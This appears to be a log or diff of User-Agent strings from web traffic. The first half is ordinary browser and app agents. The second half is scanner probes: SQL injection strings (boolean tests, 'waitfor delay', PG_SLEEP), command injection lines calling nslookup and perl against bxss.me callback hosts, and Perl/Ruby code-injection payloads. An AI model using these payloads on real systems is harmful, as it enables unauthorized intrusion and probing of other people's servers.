+Mozilla/5.0 (iPad; CPU OS 10_3_1 like Mac OS X) AppleWebKit/603.1.30 (KHTML, like Gecko) Version/10.0 Mobile/14E304 Safari/C7167
+Mozilla/5.0 (Linux; Android 10; SAMSUNG SM-T590) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/14.2 Chrome/87.0.4280.141 Safari/537.36
+Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36
+Mozilla/5.0 (Linux; Android 9; SM-A705FN Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Mobile Safari/537.36 GSA/12.24.10.23.arm64
+Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; MATMJS; rv:11.0) like Gecko/BL69thyG-7
+Mozilla/5.0 (Linux; Android 10; SM-A205U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.101 Mobile Safari/537.36 GSA/12.24.10.23.arm64
+WordPress/5.4.6; http://footballandgoals.com
+Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) coc_coc_browser/95.0.150 Chrome/89.0.4389.150 Safari/537.36
+Dalvik/2.1.0 (Linux; U; Android 8.0.0; AUM-AL20 Build/HONORAUM-AL20)
+Mozilla/5.0 (Linux; Android 5.1.1; LG-H650) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36
+Dalvik/2.1.0 (Linux; U; Android 10; ANA-AN00 Build/HUAWEIANA-AN00)
+Mozilla/5.0 (Linux; Android 9; SM-A102U Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.136 Mobile Safari/537.36 GSA/12.22.8.23.arm
+Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36
+Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36
+Mozilla/5.0 (Linux; Android 9; KFMUWI) AppleWebKit/537.36 (KHTML, like Gecko) Silk/90.3.1 like Chrome/90.0.4430.210 Safari/537.36
+Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:26.0) Gecko/20100101 Firefox/26.0
+Mozilla/5.0 (Linux; Android 11; SM-N975U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Mobile Safari/537.36
+Dalvik/2.1.0 (Linux; U; Android 11; vivo 1901 Build/RP1A.200720.012)
+okhttp/3.10.0
+Mozilla/5.0 (Linux; Android 11; SM-A515U Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Mobile Safari/537.36 GoogleApp/12.25.10.23.arm64
+Mozilla/5.0 (Linux; Android 9; JDN2-W09) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 10; Nokia 7.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36
+com.google.android.apps.searchlite/63665 (Linux; U; Android 8.1.0; en_US; U683CL; Build/U683CL_01.01.02; Cronet/72.0.3596.0)
+Mozilla/5.0 (Linux; Android 11; vivo 1819; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36 VivoBrowser/7.7.0.1
+Mozilla/5.0 (Linux; Android 10; SM-G965F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.116 Mobile Safari/537.36 EdgA/46.05.4.5158
+Dalvik/2.1.0 (Linux; U; Android 11; V2050 Build/RP1A.200720.012)
+Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; 16E)
+Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.123 Safari/537.36
+Mozilla/5.0 (Linux; U; Android 10; SM-A115F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.116 Mobile Safari/537.36 OPR/56.0.2254.57357
+Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; 25F)
+Mozilla/5.0 (Macintosh; Intel Mac OS X 109) AppleWebKit/537.43.7 (KHTML like Gecko) Version/7.0 Safari/537.43.7
+Mozilla/5.0 (Linux; Android 10; Redmi Note 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36
+Dalvik/2.1.0 (Linux; U; Android 8.1.0; DUB-LX1 Build/HUAWEIDUB-LX1)
+Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; D01)
+Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; 186)
+Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36
+Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) coc_coc_browser/96.0.226 Chrome/90.0.4430.226 Safari/537.36
+Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; 656)
+Dalvik/2.1.0 (Linux; U; Android 10; moto g(7) plus Build/QPWS30.61-21-18-7)
+Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; BBE)
+Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/7.0; Touch; .NET4.0C; .NET4.0E; Tablet PC 2.0; Zoom 3.6.0)
+Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.52 Safari/537.36 OPR/15.0.1147.100
+Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.2182.26 Safari/537.36
+Dalvik/2.1.0 (Linux; U; Android 9; SM-T820 Build/PPR1.180610.011)
+Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.109 Safari/537.36
+Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2775.68 Safari/537.36
+Dalvik/2.1.0 (Linux; U; Android 9; Nokia 5.1 Plus Build/PPR1.180610.011)
+Mozilla/5.0 (Linux; Android 9; SM-A730F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 11; RMX2161) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.66 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-G955U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/14.0 Chrome/87.0.4280.141 Mobile Safari/537.36
+Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.11) Gecko/20071127 Firefox/2.0.0.13
+Mozilla/5.0 (X11; Linux x86_64; U; en; rv:1.8.1) Gecko/20061208 Firefox/2.0.0
+Mozilla/5.0 (Linux; Android 10; moto g(9) play Build/QPXS30.30-Q3-38-69-1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.101 Mobile Safari/537.36 GSA/12.22.8.23.arm64
+Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3058.0 Safari/537.36
+Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.835.18 Safari/535.1
+Mozilla/5.0 (Linux; Android 7.0; SAMSUNG SM-J327U Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.4 Chrome/67.0.3396.87 Mobile Safari/537.36
+Yandex DocViewer
+Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4932.120 Safari/537.36
+Mozilla/5.0 (Linux; Android 11; SM-N770F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Mobile Safari/537.36
+Dalvik/2.1.0 (Linux; U; Android 10; M2006C3LI MIUI/V12.0.9.0.QCDINXM)
+Mozilla/5.0 (BlackBerry; U; BlackBerry 9850; en-US) AppleWebKit/534.11  (KHTML, like Gecko) Version/7.0.0.254 Mobile Safari/534.11
+Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1 Mobile/15E148 Safari/604.1
+Mozilla/5.0 (Linux; Android 8.1.0; SM-C710F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Mobile Safari/537.36
+Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.89 Safari/537.36
+Mozilla/5.0 (Linux; U; Android 10; Nokia 2.3 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.99 Mobile Safari/537.36 OPR/51.0.2254.150807
+Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3392.101 Safari/537.36
+Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 11; SM-G981B Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.101 Mobile Safari/537.36 GSA/12.23.16.23.arm64
+Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-G970F Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.4 Chrome/67.0.3396.87 Mobile Safari/537.36
+Mozilla/4.0 (compatible; MSIE 5.0; Series80/2.0 Nokia9500/4.51 Profile/MIDP-2.0 Configuration/CLDC-1.1)
+Mozilla/5.0 (Linux; Android 10; Redmi Note 9 Pro Max) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Mobile Safari/537.36
+Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.16) Gecko/20080716 (Gentoo) Galeon/2.0.6
+Mozilla/5.0 (Linux; Android 9; SM-T510 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.88 Safari/537.36 GSA/12.19.11.23.arm
+Mozilla/5.0 (Linux; Android 7.1.1; Moto E (4) Build/NPQS26.69-64-23; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.152 Mobile Safari/537.36 GSA/12.22.8.23.arm
+Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/601.2.7 (KHTML, like Gecko) Version/9.0.1 Safari/601.2.7
+Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36 OPR/76.0.4017.177
+Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36
+Mozilla/5.0 (Linux; Android 10; LM-K300 Build/QKQ1.200108.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.101 Mobile Safari/537.36 GSA/12.22.8.23.arm
+Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.128 Safari/537.36 OPR/75.0.3969.285
+Mozilla/5.0 (iPad; CPU OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A5362a Safari/604.1
+Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36
+Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 YJApp-IOS jp.co.yahoo.ipn.appli/4.41.5
+1Btbvyn2mVO
+${9999022 10000448}
+'.gethostbyname(lc('hitgw'.'cxsxwzepaaa51.bxss.me.')).'A'.chr(67).chr(hex('58')).chr(117).chr(85).chr(106).chr(69).'
+".gethostbyname(lc("hitnu"."btgixfcw8ef95.bxss.me."))."A".chr(67).chr(hex("58")).chr(122).chr(84).chr(106).chr(83)."
+" "A".concat(70-3).concat(22*4).concat(112).concat(77).concat(111).concat(78) (require"socket" Socket.gethostbyname("hityl" "qdrbxbej080d5.bxss.me.")[3].to_s) "
+echo huwzbl$()\ ieulru\nz^xyu||a #' &echo huwzbl$()\ ieulru\nz^xyu||a #|" &echo huwzbl$()\ ieulru\nz^xyu||a #
+' 'A'.concat(70-3).concat(22*4).concat(103).concat(72).concat(99).concat(81) (require'socket' Socket.gethostbyname('hitrl' 'amioswpq1cf48.bxss.me.')[3].to_s) '
+&echo oloayf$()\ zqygzv\nz^xyu||a #' &echo oloayf$()\ zqygzv\nz^xyu||a #|" &echo oloayf$()\ zqygzv\nz^xyu||a #
+|echo fmeitr$()\ rdchli\nz^xyu||a #' |echo fmeitr$()\ rdchli\nz^xyu||a #|" |echo fmeitr$()\ rdchli\nz^xyu||a #
+(nslookup hitupzzpjzryke225b.bxss.me||perl -e "gethostbyname('hitupzzpjzryke225b.bxss.me')")
+$(nslookup hitmnffmycjqha2d67.bxss.me||perl -e "gethostbyname('hitmnffmycjqha2d67.bxss.me')")
+GCdhMGZd
+-1 OR 2 288-288-1=0 0 0 1 --
+&(nslookup hitrdgngtiivtbb407.bxss.me||perl -e "gethostbyname('hitrdgngtiivtbb407.bxss.me')")&'\"`0&(nslookup hitrdgngtiivtbb407.bxss.me||perl -e "gethostbyname('hitrdgngtiivtbb407.bxss.me')")&`'
+|(nslookup hitetidefeamz0c2f5.bxss.me||perl -e "gethostbyname('hitetidefeamz0c2f5.bxss.me')")
+-1 OR 2 651-651-1=0 0 0 1
+-1' OR 2 668-668-1=0 0 0 1 --
+`(nslookup hitahwjhwyzfta4581.bxss.me||perl -e "gethostbyname('hitahwjhwyzfta4581.bxss.me')")`
+-1' OR 2 265-265-1=0 0 0 1 or 'noKWbYMz'='
+;(nslookup hitqivqngtgjj3ce1a.bxss.me||perl -e "gethostbyname('hitqivqngtgjj3ce1a.bxss.me')")|(nslookup hitqivqngtgjj3ce1a.bxss.me||perl -e "gethostbyname('hitqivqngtgjj3ce1a.bxss.me')")&(nslookup hitqivqngtgjj3ce1a.bxss.me||perl -e "gethostbyname('hitqivqngtgjj3ce1a.bxss.me')")
+-1" OR 2 47-47-1=0 0 0 1 --
+1C9xDCo6EcO
+1PHtFhErpO
+1CztQVtSkaO
+1Bq8yF2SZVO
+1oS8sErBnO
+1C4067lK9iO
+1BL3ZPng5eO
+pEa6fiy4'; waitfor delay '0:0:15' --
+echo xbbftm$()\ fumpvs\nz^xyu||a #' &echo xbbftm$()\ fumpvs\nz^xyu||a #|" &echo xbbftm$()\ fumpvs\nz^xyu||a #
+GB9Blblx'); waitfor delay '0:0:15' --
+&echo ljgelm$()\ fqztaz\nz^xyu||a #' &echo ljgelm$()\ fqztaz\nz^xyu||a #|" &echo ljgelm$()\ fqztaz\nz^xyu||a #
+|echo lmotik$()\ tryrhi\nz^xyu||a #' |echo lmotik$()\ tryrhi\nz^xyu||a #|" |echo lmotik$()\ tryrhi\nz^xyu||a #
+(nslookup hitinfnvyxoyicd6c4.bxss.me||perl -e "gethostbyname('hitinfnvyxoyicd6c4.bxss.me')")
+$(nslookup hittajtsixpere138b.bxss.me||perl -e "gethostbyname('hittajtsixpere138b.bxss.me')")
+&(nslookup hitmbtammhugu174c6.bxss.me||perl -e "gethostbyname('hitmbtammhugu174c6.bxss.me')")&'\"`0&(nslookup hitmbtammhugu174c6.bxss.me||perl -e "gethostbyname('hitmbtammhugu174c6.bxss.me')")&`'
+|(nslookup hitgabxjyerff433ee.bxss.me||perl -e "gethostbyname('hitgabxjyerff433ee.bxss.me')")
+`(nslookup hitnlgqqzhtfebd4c6.bxss.me||perl -e "gethostbyname('hitnlgqqzhtfebd4c6.bxss.me')")`
+iuvXJDGJ')); waitfor delay '0:0:15' --
+;(nslookup hitibetnefpyf836f8.bxss.me||perl -e "gethostbyname('hitibetnefpyf836f8.bxss.me')")|(nslookup hitibetnefpyf836f8.bxss.me||perl -e "gethostbyname('hitibetnefpyf836f8.bxss.me')")&(nslookup hitibetnefpyf836f8.bxss.me||perl -e "gethostbyname('hitibetnefpyf836f8.bxss.me')")
+rNJPYNqD' OR 405=(SELECT 405 FROM PG_SLEEP(15))--
+YNmwUJA2') OR 538=(SELECT 538 FROM PG_SLEEP(15))--
+aBIXOMPz')) OR 337=(SELECT 337 FROM PG_SLEEP(15))--
+@@qADfb
+${9999236 9999452}
+-1 OR 2 485-485-1=0 0 0 1 --
+-1 OR 2 18-18-1=0 0 0 1
+-1' OR 2 505-505-1=0 0 0 1 --
+-1' OR 2 995-995-1=0 0 0 1 or 'odsPl3Iu'='
+-1" OR 2 92-92-1=0 0 0 1 --
+CKERDT94
+-1 OR 2 264-264-1=0 0 0 1 --
+-1 OR 2 582-582-1=0 0 0 1
+-1' OR 2 657-657-1=0 0 0 1 --
+-1' OR 2 588-588-1=0 0 0 1 or 'YJdYQ00B'='
+pNouwTkZ
+-1" OR 2 685-685-1=0 0 0 1 --
+KtpQTgnU
+Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36' AND 2*3*8=6*8 AND '3hrC'='3hrC
+-1 OR 2 915-915-1=0 0 0 1 --
+-1 OR 2 90-90-1=0 0 0 1
+-1' OR 2 293-293-1=0 0 0 1 --
+Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36' AND 2*3*8=6*9 AND '3hrC'='3hrC
+-1' OR 2 450-450-1=0 0 0 1 or '7wHBRqnJ'='
+3nlfICv9
+Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36" AND 2*3*8=6*8 AND "UPv7"="UPv7
+-1" OR 2 79-79-1=0 0 0 1 --
+-1 OR 2 624-624-1=0 0 0 1 --
+Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36%' AND 2*3*8=6*8 AND 'QhPu'!='QhPu%
+-1 OR 2 85-85-1=0 0 0 1
+Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36%' AND 2*3*8=6*9 AND 'QhPu'!='QhPu%
+-1 OR 2 484-484-1=0 0 0 1
+-1' OR 2 57-57-1=0 0 0 1 --
+-1 OR 3 484-484-1=0 0 0 1
+-1' OR 2 871-871-1=0 0 0 1 or 'vLH4LMd0'='
+Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36' RLIKE (SELECT (CASE WHEN (829=829) THEN 1 ELSE 0x28 END)) --
+-1" OR 2 374-374-1=0 0 0 1 --
+9Hy6DOfR
+Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36' RLIKE (SELECT (CASE WHEN (829=0*829) THEN 1 ELSE 0x28 END)) --
+-1 OR 2 269-269-1=0 0 0 1 --
+RJHhMbSk
+-1 OR 2 381-381-1=0 0 0 1
+-1 OR 2 798-798-1=0 0 0 1 --
+-1' OR 2 646-646-1=0 0 0 1 --
+-1 OR 2 200-200-1=0 0 0 1
+2Vww1OW2
+-1' OR 2 206-206-1=0 0 0 1 or 'x4DGa2Zu'='
+-1' OR 2 374-374-1=0 0 0 1 --
+-1 OR 2 752-752-1=0 0 0 1 --
+-1" OR 2 974-974-1=0 0 0 1 --
+-1' OR 2 735-735-1=0 0 0 1 or 'FvFj5kwn'='
+-1 OR 2 894-894-1=0 0 0 1
+-1" OR 2 771-771-1=0 0 0 1 --
+-1' OR 2 781-781-1=0 0 0 1 --
+-1' OR 2 167-167-1=0 0 0 1 or 'pZhixuvu'='
+-1" OR 2 74-74-1=0 0 0 1 --
+s0Nk2lAE'; waitfor delay '0:0:15' --
+'.gethostbyname(lc('hitnw'.'hxzwyblf890f1.bxss.me.')).'A'.chr(67).chr(hex('58')).chr(105).chr(77).chr(113).chr(69).'
+".gethostbyname(lc("hitwy"."vmbtqqmqbee40.bxss.me."))."A".chr(67).chr(hex("58")).chr(105).chr(88).chr(104).chr(85)."
+mxmnwnFp'); waitfor delay '0:0:15' --
+LqEof7W8'; waitfor delay '0:0:15' --
+rfmgGwwf'; waitfor delay '0:0:15' --
+DpuxLiWR')); waitfor delay '0:0:15' --
+3pl82Ora'); waitfor delay '0:0:15' --
+FthT0Lcw'); waitfor delay '0:0:15' --
+vyiIL3yx'; waitfor delay '0:0:15' --
+GI7YTNCS' OR 185=(SELECT 185 FROM PG_SLEEP(15))--
+aBT1MGSw'; waitfor delay '0:0:15' --
+hApWvWUR')); waitfor delay '0:0:15' --
+R1rJoteT')); waitfor delay '0:0:15' --
+m0WhSDYa'; waitfor delay '0:0:15' --
+FFWoMSmG'); waitfor delay '0:0:15' --
+3RdqlF5o') OR 831=(SELECT 831 FROM PG_SLEEP(15))--
+UHFgnia4'; waitfor delay '0:0:15' --
+wmFrn8li'); waitfor delay '0:0:15' --
+CcgcXHfR' OR 908=(SELECT 908 FROM PG_SLEEP(15))--
+PGpH9CQv' OR 673=(SELECT 673 FROM PG_SLEEP(15))--
+1ToKMcE2'; waitfor delay '0:0:15' --
+yrcS0E7O'); waitfor delay '0:0:15' --
+Qo9J5LAX')); waitfor delay '0:0:15' --
+Ka2Z7Lfy')) OR 661=(SELECT 661 FROM PG_SLEEP(15))--
+gGAy4lYU'); waitfor delay '0:0:15' --
+ZvXQkQey')); waitfor delay '0:0:15' --
+jHf8TDXI') OR 608=(SELECT 608 FROM PG_SLEEP(15))--
+yiTUwjPE') OR 669=(SELECT 669 FROM PG_SLEEP(15))--
+CbUdqnqv'); waitfor delay '0:0:15' --
+B7r7pI42')); waitfor delay '0:0:15' --
+3kWlhsW2' OR 552=(SELECT 552 FROM PG_SLEEP(15))--
+yTzOwQJP')); waitfor delay '0:0:15' --
+@@XmIq4
+QvsnSoht' OR 204=(SELECT 204 FROM PG_SLEEP(15))--
+oTe7PIAZ')) OR 730=(SELECT 730 FROM PG_SLEEP(15))--
+YTVSXBcp')) OR 42=(SELECT 42 FROM PG_SLEEP(15))--
+1Vd9G3PX')); waitfor delay '0:0:15' --
+ILNFIE2o' OR 208=(SELECT 208 FROM PG_SLEEP(15))--
+mOL9MCYN') OR 278=(SELECT 278 FROM PG_SLEEP(15))--
+9jOUuvMJ' OR 158=(SELECT 158 FROM PG_SLEEP(15))--
+Oj9saV17') OR 755=(SELECT 755 FROM PG_SLEEP(15))--
+" "A".concat(70-3).concat(22*4).concat(120).concat(86).concat(120).concat(69) (require"socket" Socket.gethostbyname("hituj" "nhkszsexf25ae.bxss.me.")[3].to_s) "
+@@LhbI5
+vctKDPEH' OR 674=(SELECT 674 FROM PG_SLEEP(15))--
+' 'A'.concat(70-3).concat(22*4).concat(115).concat(70).concat(119).concat(84) (require'socket' Socket.gethostbyname('hitey' 'mpwlnjys7ab41.bxss.me.')[3].to_s) '
+CeTkXYtz') OR 504=(SELECT 504 FROM PG_SLEEP(15))--
+@@geLAy
+5kMI8nju')) OR 417=(SELECT 417 FROM PG_SLEEP(15))--
+FOvXMOZy') OR 231=(SELECT 231 FROM PG_SLEEP(15))--
+tBfelMoG')) OR 452=(SELECT 452 FROM PG_SLEEP(15))--
+T7taDUQh') OR 704=(SELECT 704 FROM PG_SLEEP(15))--
+TKTYgkkZ')) OR 547=(SELECT 547 FROM PG_SLEEP(15))--
+659I5IgE')) OR 881=(SELECT 881 FROM PG_SLEEP(15))--
+@@0TWxp
+Mq2mCSFk')) OR 684=(SELECT 684 FROM PG_SLEEP(15))--
+@@rNgMS
+@@1of98
+@@LPcHY
+@@X2rCq
+echo beqojv$()\ iluxlt\nz^xyu||a #' &echo beqojv$()\ iluxlt\nz^xyu||a #|" &echo beqojv$()\ iluxlt\nz^xyu||a #
+&echo pysbiu$()\ ulicwv\nz^xyu||a #' &echo pysbiu$()\ ulicwv\nz^xyu||a #|" &echo pysbiu$()\ ulicwv\nz^xyu||a #
+|echo yehqxo$()\ qsygxm\nz^xyu||a #' |echo yehqxo$()\ qsygxm\nz^xyu||a #|" |echo yehqxo$()\ qsygxm\nz^xyu||a #
+(nslookup hitnvonlrcxnnd2b75.bxss.me||perl -e "gethostbyname('hitnvonlrcxnnd2b75.bxss.me')")
+$(nslookup hitulmpmqjqxtced71.bxss.me||perl -e "gethostbyname('hitulmpmqjqxtced71.bxss.me')")
+&(nslookup hitllvplntwek9fa81.bxss.me||perl -e "gethostbyname('hitllvplntwek9fa81.bxss.me')")&'\"`0&(nslookup hitllvplntwek9fa81.bxss.me||perl -e "gethostbyname('hitllvplntwek9fa81.bxss.me')")&`'
+|(nslookup hitnfbycpmbmy62866.bxss.me||perl -e "gethostbyname('hitnfbycpmbmy62866.bxss.me')")
+`(nslookup hitbvoukkbaqjde915.bxss.me||perl -e "gethostbyname('hitbvoukkbaqjde915.bxss.me')")`
+;(nslookup hitinobexgealf3cb5.bxss.me||perl -e "gethostbyname('hitinobexgealf3cb5.bxss.me')")|(nslookup hitinobexgealf3cb5.bxss.me||perl -e "gethostbyname('hitinobexgealf3cb5.bxss.me')")&(nslookup hitinobexgealf3cb5.bxss.me||perl -e "gethostbyname('hitinobexgealf3cb5.bxss.me')")
+${9999566 10000009}
+'.gethostbyname(lc('hitkw'.'folbatoi48fbb.bxss.me.')).'A'.chr(67).chr(hex('58')).chr(107).chr(74).chr(118).chr(77).'
+".gethostbyname(lc("hitul"."ykacqdehaca35.bxss.me."))."A".chr(67).chr(hex("58")).chr(122).chr(74).chr(104).chr(65)."
+" "A".concat(70-3).concat(22*4).concat(110).concat(73).concat(122).concat(65) (require"socket" Socket.gethostbyname("hitmj" "zjhodsynefddb.bxss.me.")[3].to_s) "
+' 'A'.concat(70-3).concat(22*4).concat(107).concat(69).concat(110).concat(80) (require'socket' Socket.gethostbyname('hitha' 'dmajzndrdd390.bxss.me.')[3].to_s) '
+echo njaqcd$()\ yyorwa\nz^xyu||a #' &echo njaqcd$()\ yyorwa\nz^xyu||a #|" &echo njaqcd$()\ yyorwa\nz^xyu||a #
+&echo ibdkyn$()\ bmpgsx\nz^xyu||a #' &echo ibdkyn$()\ bmpgsx\nz^xyu||a #|" &echo ibdkyn$()\ bmpgsx\nz^xyu||a #
+|echo fietna$()\ jrydxr\nz^xyu||a #' |echo fietna$()\ jrydxr\nz^xyu||a #|" |echo fietna$()\ jrydxr\nz^xyu||a #
+(nslookup hitkxzqibezhk5a63b.bxss.me||perl -e "gethostbyname('hitkxzqibezhk5a63b.bxss.me')")
+$(nslookup hitxvdkuouideea83a.bxss.me||perl -e "gethostbyname('hitxvdkuouideea83a.bxss.me')")
+&(nslookup hitvipkslppsvbb091.bxss.me||perl -e "gethostbyname('hitvipkslppsvbb091.bxss.me')")&'\"`0&(nslookup hitvipkslppsvbb091.bxss.me||perl -e "gethostbyname('hitvipkslppsvbb091.bxss.me')")&`'
+|(nslookup hitwbzcdivdrmf7879.bxss.me||perl -e "gethostbyname('hitwbzcdivdrmf7879.bxss.me')")
+`(nslookup hitgxikhgwnnfd1540.bxss.me||perl -e "gethostbyname('hitgxikhgwnnfd1540.bxss.me')")`
+;(nslookup hitdydrxynhkgf5b57.bxss.me||perl -e "gethostbyname('hitdydrxynhkgf5b57.bxss.me')")|(nslookup hitdydrxynhkgf5b57.bxss.me||perl -e "gethostbyname('hitdydrxynhkgf5b57.bxss.me')")&(nslookup hitdydrxynhkgf5b57.bxss.me||perl -e "gethostbyname('hitdydrxynhkgf5b57.bxss.me')")
+${10000031 10000172}
+'.gethostbyname(lc('hityd'.'zgnsgdws3a173.bxss.me.')).'A'.chr(67).chr(hex('58')).chr(109).chr(88).chr(119).chr(67).'
+".gethostbyname(lc("hitsy"."ceemydrpe431c.bxss.me."))."A".chr(67).chr(hex("58")).chr(111).chr(78).chr(109).chr(77)."
+" "A".concat(70-3).concat(22*4).concat(106).concat(89).concat(107).concat(85) (require"socket" Socket.gethostbyname("hitsi" "zucevhil7765e.bxss.me.")[3].to_s) "
+' 'A'.concat(70-3).concat(22*4).concat(110).concat(87).concat(105).concat(83) (require'socket' Socket.gethostbyname('hitpg' 'egswfqdnfccc4.bxss.me.')[3].to_s) '
+echo mcgdtl$()\ xiqyae\nz^xyu||a #' &echo mcgdtl$()\ xiqyae\nz^xyu||a #|" &echo mcgdtl$()\ xiqyae\nz^xyu||a #
+&echo yhgqwj$()\ aagfuj\nz^xyu||a #' &echo yhgqwj$()\ aagfuj\nz^xyu||a #|" &echo yhgqwj$()\ aagfuj\nz^xyu||a #
+|echo foluhk$()\ cwpqde\nz^xyu||a #' |echo foluhk$()\ cwpqde\nz^xyu||a #|" |echo foluhk$()\ cwpqde\nz^xyu||a #
